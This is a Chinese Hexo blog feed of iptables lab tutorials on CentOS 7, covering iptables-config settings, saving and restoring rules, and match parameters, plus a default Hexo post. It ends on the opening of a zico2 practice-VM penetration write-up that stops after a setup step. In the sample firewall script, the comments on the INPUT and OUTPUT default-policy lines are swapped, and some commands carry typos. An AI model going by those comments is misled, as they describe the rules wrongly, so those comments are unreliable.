<p>IPTABLES_SAVE_ON_RESTART&#x3D;“”：当防火墙重启的时候，配置的防火墙规则是否保存，默认是不保存。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062217913.png"
                      alt="image.png"
                ></p>
<p>IPTABLES_SAVE_COUNTER&#x3D;“”：当保存规则配置的时候，防火墙计数器是否保存，默认不保存。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062218978.png"
                      alt="image.png"
                ></p>
<p>IPTABLES_STATUS_NUMERIC&#x3D;“”：当显示防火墙状态时，是否以数字的形式显示端口号和地址，默认是yes，保存退出。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062219348.png"
                      alt="image.png"
                ></p>
<p>开启防火墙，查看防火墙状态会显示默认防火墙配置，以数字的形式显示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062230652.png"
                      alt="image.png"
                ></p>
<p>如果将IPTABLES_STATUS_NUMERIC配置为no，显示内容发就不是数字形式。编辑配置文件将其配置为no，重新查看防火墙状态。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062231149.png"
                      alt="image.png"
                ></p>
<p>IPTABLES_STATUS_VERBOSE&#x3D;“”：当显示防火墙状态时，是否显示网卡接口，这里配置为yes再查看，编辑配置文件后保存退出。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062227249.png"
                      alt="image.png"
                ></p>
<p>查看防火墙状态，会发现当前规则信息中比上面的多了in和out就是网卡接口。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062228047.png"
                      alt="image.png"
                ></p>
<p>IPTABLES_STATUS_LINENUMBERS&#x3D;“”：查看时，是否显示行号，默认配置为yes。这里将其配置为no，编辑配置文件后保存退出。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062233148.png"
                      alt="image.png"
                ></p>
<p>查看防火墙状态，会发现当前规则信息比上面的少了num即行号信息，说明上面配置生效了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062232499.png"
                      alt="image.png"
                ></p>
<p>[[1-5.iptables配置的保存与还原]]</p>
]]></content>
  </entry>
  <entry>
    <title>iptables配置的保存与还原</title>
    <url>/2024/10/19/1-5.iptables%E9%85%8D%E7%BD%AE%E7%9A%84%E4%BF%9D%E5%AD%98%E4%B8%8E%E8%BF%98%E5%8E%9F/</url>
    <content><![CDATA[<h2 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><p>配置Iptables规则后不能自动保存，一旦重启就会丢失配置的规则并恢复为默认策略，针对这个问题，本实验对保存和还原iptables进行了配置。</p>
<h2 id="【知识点】"><a href="#【知识点】" class="headerlink" title="【知识点】"></a>【知识点】</h2><p>iptables配置文件</p>
<h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><p>防火墙规则的批量备份、还原两个命令，分别是：iptables-save和iptables-restore，用来保存和恢复。<br>下图是典型的防火墙规则导出后的文件。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071050462.png"
                      alt="image.png"
                ></p>
<p>上述输出的各项含义：</p>
<ul>
<li>#号开头的内容表示注释；</li>
<li>*表名：表示所在的表；例如：*nat</li>
<li>链名默认策略：表示相应的链及默认策略，具体规则部分省略了iptables命令名；</li>
<li>COMMIT：表示提交前面的规则设置；</li>
</ul>
<h2 id="【软件工具】"><a href="#【软件工具】" class="headerlink" title="【软件工具】"></a>【软件工具】</h2><ul>
<li>操作系统：Centos7</li>
<li>其他：Iptables</li>
</ul>
<h2 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h2><p>掌握Iptables配置文件的保存与还原</p>
<h2 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><h3 id="一、保存防火墙规则先介绍保存防火墙规则。"><a href="#一、保存防火墙规则先介绍保存防火墙规则。" class="headerlink" title="一、保存防火墙规则先介绍保存防火墙规则。"></a>一、保存防火墙规则先介绍保存防火墙规则。</h3><p>为了方便查看，先将filter表中默认的规则清空：iptables-F。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071052093.png"
                      alt="image.png"
                ></p>
<p>添加脚本文件，执行命令vim  firewall.sh，输入内容。添加的防火墙规则的脚本文件内容如下。这里用到了脚本配置防火墙，相比于手动配置防火墙，使用脚本配置防火墙更加方便和快捷，不用一条一条手动地添加规则。下面是对添加规则的简单介绍，如下所示：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">IPT=<span class="string">&quot;/sbin/iptables&quot;</span></span><br><span class="line"><span class="comment">#Remove  any  exsiting  rules</span></span><br><span class="line"><span class="comment">#首先清除防火墙的默认规则</span></span><br><span class="line"><span class="variable">$IPT</span>  -F</span><br><span class="line"><span class="variable">$IPT</span>  -X</span><br><span class="line"><span class="variable">$IPT</span>  -Z</span><br><span class="line"><span class="comment">#setting  for  loopback  interface</span></span><br><span class="line"><span class="comment">#允许自己的回环接口进出</span></span><br><span class="line"><span class="variable">$IPT</span>  -t  filter  -A  INPUT  -i  lo  -j  ACCEPT</span><br><span class="line"><span class="variable">$IPT</span>  -t  filter  -A  OUTPUT  -o  lo  -j  ACCEPT</span><br><span class="line"><span class="comment">#setting  default  firewall  police</span></span><br><span class="line"><span class="comment">#设置默认规则</span></span><br><span class="line"><span class="variable">$IPT</span>  -P  OUTPUT  ACCEPT  <span class="comment">#忽略进入的请求</span></span><br><span class="line"><span class="variable">$IPT</span>  -P  FORWARD  DROP  <span class="comment">#忽略要通过的</span></span><br><span class="line"><span class="variable">$IPT</span>  -P  INPUT  DROP  <span class="comment">#允许出去的请求</span></span><br><span class="line"><span class="comment">#setting  access  rules</span></span><br><span class="line"><span class="comment">#配置规则</span></span><br><span class="line"><span class="variable">$IPT</span>  -t  filter  -A  INPUT  -s  192.168.1.0/24  -p  all  -j  ACCEPT  <span class="comment">#允许此网段的ip连接</span></span><br><span class="line"><span class="comment">#http</span></span><br><span class="line"><span class="variable">$IPT</span>  -t  filter  -A  INPUT  -p  tcp  --dport  80  -j  ACCEPT  <span class="comment">#允许80端口对外提供连接</span></span><br><span class="line"><span class="comment">#icmp</span></span><br><span class="line"><span class="variable">$IPT</span>  -t  filter  -A  INPUT  -p  icmp  -m  icmp  --icmp-type  any  -j  ACCEPT  <span class="comment">#允许所有人ping</span></span><br><span class="line"><span class="comment">#others  RELATED</span></span><br><span class="line"><span class="variable">$IPT</span>  -A  INPUT  -m  state  --state  ESTABLISHED,RELATED  -j  ACCEPT  <span class="comment">#允许关联包通过</span></span><br><span class="line"><span class="variable">$IPT</span>  -A  OUTPUT  -m  state  --state  ESTABLISHED,RELATED  -j  ACCEPT</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071108031.png"
                      alt="image.png"
                ></p>
<p>打开终端，输入命令执行脚本文件，若提示权限不够，需要添加权限。这样脚本文件中的防火墙规则就一起添加上了，掌握脚本文件配置会方便很多。再输入命令查看防火墙规则。<br>chmod  +x  firewall.sh  提示权限不够添加权限<br>.&#x2F;firewall.sh  执行脚本文件配置防火墙<br>iptables  -L  -n  –line-numbers  查看防火墙规则<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071109013.png"
                      alt="image.png"
                ></p>
<p>但此时添加的防火墙规则只存在于内存中，并没有写入iptables配置文件中，一旦重启就会消失。要将添加的规则永久保存，需要添加到配置文件中，在终端输入命令iptables-save&gt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071110538.png"
                      alt="image.png"
                ></p>
<p>此时在终端输入命令cat  &#x2F;etc&#x2F;sysconfig&#x2F;iptables，可以看到防火墙规则已经添加到配置文件中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071110137.png"
                      alt="image.png"
                ></p>
<p>备份防火墙规则：在终端输入命令iptables-save&gt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables-back，将防火墙规则保存备份到&#x2F;etc&#x2F;sysconfig&#x2F;iptables-back文件中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071111899.png"
                      alt="image.png"
                ></p>
<p>清空防火墙规则。在终端输入如下命令，先清空防火墙规则，保存并重启防火墙，可以看到此时的防火墙规则为空。<br>iptables  -F  清空防火墙<br>iptabels  -X  删除自定义链<br>iptables  -Z  刷新计数器<br>iptables-save&gt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables  保存防火墙规则配置<br>systemctl  restart   iptables  重启防火墙<br>systemctl  status  iptables  查看防火墙状态<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071113228.png"
                      alt="image.png"
                ></p>
<h3 id="二、还原防火墙规则"><a href="#二、还原防火墙规则" class="headerlink" title="二、还原防火墙规则"></a>二、还原防火墙规则</h3><p>在终端输入命令iptables-restore&lt;&#x2F;etc&#x2F;sysconfig&#x2F;iptables-back，可以看到此时恢复的防火墙规则只位于内存中，并没有写到防火墙配置文件中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071115884.png"
                      alt="image.png"
                ></p>
<p>查看规则的详细信息，也可以使用前面实验介绍的命令iptables-nvL来查看。所以“iptables-restore&lt;防火墙规则备份文件”只是将规则恢复到内存中，若想恢复到配置文件中，还需要将规则保存到配置文件中。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410071115364.png"
                      alt="image.png"
                ></p>
]]></content>
  </entry>
  <entry>
    <title>iptables 的主要命令与扩展参数</title>
    <url>/2024/10/19/1-3.iptables%20%E7%9A%84%E4%B8%BB%E8%A6%81%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%89%A9%E5%B1%95%E5%8F%82%E6%95%B0/</url>
    <content><![CDATA[<h2 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><p>了解 Iptables 常用封包匹配参数及其使用格式，利用常用命令参数进行 iptables 规则配置，使用 iptables  –icmp-type的 code对应表进行操作。</p>
<h2 id="【知识点】"><a href="#【知识点】" class="headerlink" title="【知识点】"></a>【知识点】</h2><p>iptables 参数</p>
<h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p>iptables [-t table] COMMAND chain CRETIRIA -j ACTION<br>-t table : 3 个 filter nat mangle<br>COMMAND：定义如何对规则进行管理<br>chain：指定你接下来的规则到底是在哪个链上操作的，当定义策略的时候，是可以省略的。<br>CRETIRIA：指定匹配标准　<br>-j ACTION：指定如何进行处理　</p>
<h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062114089.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062114867.png"
                      alt="image.png"
                ></p>
<h3 id="动作说明"><a href="#动作说明" class="headerlink" title="动作说明"></a>动作说明</h3><p>处理动作除了ACCEPT、REJECT、DROP、REDIRECT和MASQUERADE以外，还多出LOG、ULOG、DNAT、SNAT、MIRROR、QUEUE、RETURN、TOS、TTL、MARK等，其中某些处理动作不会中断过滤程序，某些处理动作则会中断同一规则链的过滤，并依照前述流程继续进行下一个规则链的过滤，一直到堆栈中的规则检查完毕为止。透过这种机制所带来的好处是，我们可以进行复杂、多重的封包过滤，简单的说，iptables可以进行纵横交错式的过滤（tables）而非链状过滤（chains）。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062115923.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062116566.png"
                      alt="image.png"
                ></p>
<h2 id="【软件工具】"><a href="#【软件工具】" class="headerlink" title="【软件工具】"></a>【软件工具】</h2><ul>
<li>操作系统：Centos7</li>
<li>其他：Iptables</li>
</ul>
<h2 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h2><ul>
<li>掌握Iptables主要参数命令的使用</li>
<li>掌握Iptables扩展参数及语法格式</li>
</ul>
<h2 id="【实验步骤】"><a href="#【实验步骤】" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><h3 id="一、Iptables主要命令：常用封包匹配参数介绍"><a href="#一、Iptables主要命令：常用封包匹配参数介绍" class="headerlink" title="一、Iptables主要命令：常用封包匹配参数介绍"></a>一、Iptables主要命令：常用封包匹配参数介绍</h3><p>匹配协议：<br>参数-p，–protocol：用来匹配指定协议，如tcp、icmp、udp等。<br>范例：iptables  -A  INPUT  -p  tcp，指定协议为tcp。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062118183.png"
                      alt="image.png"
                ></p>
<p>匹配源IP：<br>参数-S，–src，–source：用来匹配封包的来源IP，可以匹配单机或网络，匹配网络时用数字来表示子网掩码。<br>范例：iptables  -A  INPUT  -s  192.168.1.1。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062119450.png"
                      alt="image.png"
                ></p>
<p>匹配目的IP：<br>参数-d，–dst，–destination：用来匹配封包的目的地IP。<br>范例：iptabels  -A  INPUT  -d  192.168.1.1。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062120524.png"
                      alt="image.png"
                ></p>
<p>匹配封包从哪块网卡进入：<br>参数-i，–in-interface：用来匹配封包是从哪块网卡进入。<br>范例：iptables  -A  INPUT  -i  eth0，进入的网卡匹配为eth0。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062121867.png"
                      alt="image.png"
                ></p>
<p>匹配封包从哪块网卡送出：<br>参数-O，–out-interface：用来匹配封包要从哪块网卡送出，设定方式同上。<br>范例：iptables  -A  FORWARD  -o  eth0。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062122641.png"
                      alt="image.png"
                ></p>
<h3 id="二、iptables主要命令：编辑规则命令介绍"><a href="#二、iptables主要命令：编辑规则命令介绍" class="headerlink" title="二、iptables主要命令：编辑规则命令介绍"></a>二、iptables主要命令：编辑规则命令介绍</h3><p>添加规则：<br>参数-A，–append：在规则列表增加规则，该规则会成为规则链中的最后一条规则。<br>范例：iptables  -A  INPUT  -p  icmp  -j  DROP，不允许icmp通过INPUT链。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062125183.png"
                      alt="image.png"
                ></p>
<p>删除规则：<br>参数-D，–delete：从规则链中删除规则，可以输入完整规则，或者直接指定规则编号加以删除。<br>范例1：iptables  -D  INPUT  -p  icmp  -j  DROP，输入规则进行删除。<br>iptables  -nvL  查看上面添加的规则没有了。<br>范例2：使用编号进行删除。<br>iptables  –line-numbers  -L  先以编号形式列出规则<br>iptables  -D  INPUT  2  输入编号进行删除，删除第2条<br>iptables  –line-numbers  -L  查看规则原来的第2条被删除<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062127069.png"
                      alt="image.png"
                ></p>
<p>插入规则：<br>参数-I，–insert：插入一条规则，原本该位置上的规则将会往后移动一个顺位，配置位置默认插入到最上面。<br>范例1：iptables  -I  INPUT  -p  icmp  -j  DROP，iptables  -nvL  查看规则链，规则被插在第一条<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062128468.png"
                      alt="image.png"
                ></p>
<p>范例2：iptables  -I  INPUT  2  -p  udp  -j  ACCEPT，iptables  -nvL查看规则，插在了第二条<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062129927.png"
                      alt="image.png"
                ></p>
<p>取代现有规则：<br>参数-R，–replace：取代现行规则，规则被取代后并不会改变顺序。<br>范例：取代第1条规则。<br>iptables  -L –line-number  查看规则<br>iptables  -R  INPUT  1  -s  192.168.1.3  -j  DROP  取代第1条的现行规则<br>iptables  -L  –line-number查看取代后的规则,会发现操作成功<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062130008.png"
                      alt="image.png"
                ></p>
<p>将封包计数器归零：<br>参数-Z，–zero：将规则的封包计数器归零。封包技术器是用来计算同一封包出现次数，是过滤阻断式攻击不可或缺的工具。<br>范例：计数器封零<br>iptables  -nvL，查看防火墙规则的详细信息<br>iptables  -Z，将封包计数器归零<br>iptables  -nvL，再次查看会发现信息中匹配到的数据包都为零<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062131100.png"
                      alt="image.png"
                ></p>
<p>删除所有规则：<br>参数-F，–flush：删除默认表中的所有规则。<br>范例1：iptables  -F  INPUT  删除filter表INPUT链中的所有规则。<br>范例2：iptables  -F  删除filter表中所有链的规则。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062133815.png"
                      alt="image.png"
                ></p>
<h3 id="三、iptables扩展参数介绍与操作"><a href="#三、iptables扩展参数介绍与操作" class="headerlink" title="三、iptables扩展参数介绍与操作"></a>三、iptables扩展参数介绍与操作</h3><p>iptables除了上面实验介绍的主要参数，还会有一些扩展参数的使用。iptables能够使用一些与模块匹配的扩展包。以下是一些参数的介绍，而且他们大多数都可以通过在前面加上！来表示相反的意思。下面主要介绍扩展参数的使用格式，大部分没有配置处理动作，实际应用添加-j处理动作使用即可。<br>下面是tcp协议中扩展参数的介绍：匹配源端口<br>参数—sport，–source-port：用来匹配封包的源端口，可以匹配单一端口或是一个范围，例如：–sport22:80，表示22到80端口之间，如果要匹配不连续的多个端口，必须要使用–multiport，下面会进行介绍。<br>范例：iptables  -A  INPUT  -p  tcp  –sport  22，匹配通信源端口为22。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062136738.png"
                      alt="image.png"
                ></p>
<p>匹配目的端口：<br>参数—dport，–destination-port：用来匹配封包的目的端口号。<br>范例：iptables  -A  INPUT  -p  tcp  –dport  80，匹配通信目的端口为80。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062138130.png"
                      alt="image.png"
                ></p>
<p>匹配标志：<br>参数–tcp-flags：说明匹配TCP封包的状态标志，参数分为两个部分，第一个部分列举出想匹配的状态，第二部分列举出状态中被设置的标志，未被列举的标志必须是空的。TCP状态标志包括：SYN（同步）、FIN（结束）、RST（重设）、URG（紧急）、PSH（强迫推送）等均可使用于参数中，除此之外还可以使用关键词ALL和NONE进行匹配。<br>范例：iptables  -A  INPUT  -p  tcp  –tcp-flags  SYN,FIN,ACK SYN<br>参数–syn：用来表示TCP通信协议中，SYN位被打开，而ACK与FIN位关闭的分组，即TCP的初始连接。<br>范例：iptables  -A  INPUT  -p  tcp  –syn。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062142808.png"
                      alt="image.png"
                ></p>
<p>udp模块的扩展参数使用：在指定udp协议时的扩展参数主要有–sport和–dport，使用方法与tcp配置一样。<br>multiport相关扩展参数介绍：这个模块匹配一组源端口或目标端口，最多可以指定15个端口，只能和-ptcp或者-pudp连着使用。<br>匹配多个端口：<br>参数-m  multiport  –source-port：用来匹配不连续的多个源端口，一次最多可匹配15个端口，可以使用！运算符进行反向匹配。<br>范例：iptables  -A  INPUT  -p  tcp  -m  multiport  –source-port  22,53,80,110<br>参数-m  multiport  –destination-port：用来匹配不连续的多个目的端口号。<br>范例：iptables  -A  INPUT  -p  tcp  -m  multiport  –destination-port  22,53,80,110<br>参数-m  multiport–port：这个参数比较特殊，用来匹配源端口和目的端口号相同的封包。注意：在本范例中，如果源端口号为80目的端口号为110，这种封包并不算符合条件。<br>范例：iptables  -A  INPUT  -p  tcp  -m  multiport  –port  22,53,80,110，先清空防火墙，再配置上面参数。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062145762.png"
                      alt="image.png"
                ></p>
<p>state相关扩展参数介绍：此模块当与连接跟踪综合使用时，允许访问包的连接跟踪状态。<br>匹配连接状态：<br>参数-m  state  –state：用来匹配连接状态，共有4种连接状态：NEW（表示该封包想要起始一个连接（重设连接或将连接重导向））、ESTABLISHED（表示该封包属于某个已经建立的连接）、RELATED（表示该封包是属于某个已经建立的连接，所建立的新连接）和INVALID（表示该封包的连接2编号（SessionID）无法辨识或编号不正确）。<br>范例：iptables  -I  INPUT  -p  tcp  -m  state  –state  NEW。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062146545.png"
                      alt="image.png"
                ></p>
<p>limit模块参数介绍：这个模块匹配标志用一个标记桶过滤器（定速度进行匹配），它和LOG目标结合使用来给出有限的登陆数，当达到这个极限值时，使用这个扩展包的规则进行匹配。<br>匹配流量：<br>参数-m  limit  –limit：用来匹配某段时间内封包的平均流量，可以匹配的时间参数每秒钟、每分钟、每小时或每天平均一次，默认为每小时平均一次，参数如后：&#x2F;second、&#x2F;minute、&#x2F;hour、&#x2F;day。除了进行封包数量的匹配外，设定这个参数也会在条件达成时，暂停封包的匹配动作，以避免因骇客使用洪水攻击，导致服务被阻断。<br>范例：iptables  -A  INPUT  -m  limit  –limit  3&#x2F;hour，匹配每小时平均流量是否超过3个封包。<br>参数–limit-burst：用来匹配瞬间封包的数量，超过此上限的封包将被直接丢弃。<br>范例：iptables  -A  INPUT  -m  limit  –limit-burst 5，匹配一次同时涌入的封包是否超过5个（这是默认值）。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062147028.png"
                      alt="image.png"
                ></p>
<p>icmp模块的相关扩展参数介绍：匹配硬件地址<br>参数-m  mac  –mac-source：用来匹配封包来源接口的硬件地址，这个参数不能用在OUTPUT和POSTROUTING规则链上，因为封包要送到网卡后才能由网卡驱动程序透过ARP通讯协议查出目的地的MAC地址，所以iptables在进行封包匹配时并不知道封包会送到那个网络接口。<br>范例：iptables  -A  INPUT  -m  mac  –mac-source  00:00:00:11:11:11。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062148491.png"
                      alt="image.png"
                ></p>
<p>匹配icmp类型：<br>参数icmp-type：用来匹配ICMP的类型编号，可以使用代码或数字编号来进行匹配。可以执行命令iptables  -p<br>icmp–help来查看使用说明。<br>使用格式1：–icmp-type  typename  &#x2F;&#x2F;matchicmptype<br>范例：iptables  -A  INPUT  -p  icmp  –icmp-type  echo-request  使用类型名称进行配置<br>使用格式2：–icmp-type  type[&#x2F;code]  &#x2F;&#x2F;(ornumerictypeortype&#x2F;code)<br>范例：iptables  -A  INPUT  -p  icmp  –icmp-type  8  使用类型数字进行配置<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062149388.png"
                      alt="image.png"
                ></p>
<p>下面图片展示了iptables  –icmp-type的code对应表（type：类型字段，code：代码字段，Description：用途，Query：查询类，Error：差错类）<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062150510.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://hongmengshikong.oss-cn-wuhan-lr.aliyuncs.com/img_for_note/202410062150174.png"
                      alt="image.png"
                ></p>
<p>[[1-4.Iptables配置文件]]</p>
]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/10/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>入门靶机渗透之zico2</title>
    <url>/2024/10/19/%E5%85%A5%E9%97%A8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8Bzico2/</url>
    <content><![CDATA[<p>在VMware中导入该虚拟机，导入完成后配置网卡，确保与自己的攻击机在同一网段，然后开启虚拟机<br>先查看本机所在ip地址</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
